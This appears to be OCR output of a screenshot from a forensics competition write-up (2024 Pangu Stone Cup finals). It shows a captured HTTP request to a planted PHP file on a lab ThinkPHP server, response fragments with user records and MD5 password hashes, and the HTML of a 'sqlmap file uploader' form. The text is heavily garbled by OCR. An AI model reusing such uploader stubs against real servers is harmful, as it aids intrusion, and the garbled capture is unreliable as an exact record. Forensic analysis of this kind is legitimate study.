@@ -1,0 +1,56 @@
+# OCR: e2b2b00c91b3b9d209d161cd0cf90de3.webp
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/e2b2b00c91b3b9d209d161cd0cf90de3.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:16
+
++FeseeieeeeieeeteeeeeF+Fieees+eFeeeiFieeeeeeeeie0eF
+[#281:
+HTTp reguest
+GET /ThinkPHP/Library/Think/tmpumqvm.php HTTP/1.1 Host:192.168.11.6
+Accept:application/json, text/javascript,*/*, q=0.01 X-Requested-With: XMLHttpRequest
+User-agent: Mozi1la/5.0 (Windows NT 10.0; Win64; x64) Applewebkit/537.36 (KHTML, 1ike Gecko) Chrome/91.0.4472.124 Safari/537.36
+1charset=UTF-8
+Content-type:application/x-www-form-urlencoded; origin:http://192.168.11.6
+Referer:http://192.16B.11.6/Home/User/tkppwd
+Accept-encoding: gzip, deflate Accept-language;zh-cN,zhiq=0.9
+Cookie:PHPSESSID=unqve7if2olqp31b8p92cukds5 Connection: close
+HTTPresponse
+【#28】
+(200OK):
+Date: Wed, 22 May 2024 04:08:09
+GMT
+(win32)OpensSL/1.0.2jmod_fcgid/2.3.9
+Server: Apache/2.4.23
+X-Powered-By:PHp/5.6.27 Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=Ur-8
+http://192.168.11.6:80/ThinkPHP/Library/Think/t
+ORI
+test123test123 fcea920f7412b5da7be0cf42bBc93759 295
+/uploads/qrcode/2022-05-06/1651817735_738264484.png1
+umcvm.phg
+0 0
+0
+/public/Home/user/image/1.png
+0.00
+0
+10.92.91.8
+1651817732
+0
+e10adc3949ba59abbe56e057f20f883e
+N
+o LN
+0.00 AN<form
+0.00
+0.00
+o
+action=/ThinkPHp/Library/Think/tmpumqvm.php method=posTenctype=multipart/form-data><input
+type=hidden name=MAX_FILE_sIzE value=1000000000><b>sqlmap file uploader</b><br><input
+type=submit name=upload value=upload></form>
+type=file><br>to directory:
+<input
+type=text name=uploadDirvalue=C:phpstudy\wWW\ThinkPHp(Library\Think\><input
+#####################################################################
+0.00
+name=file
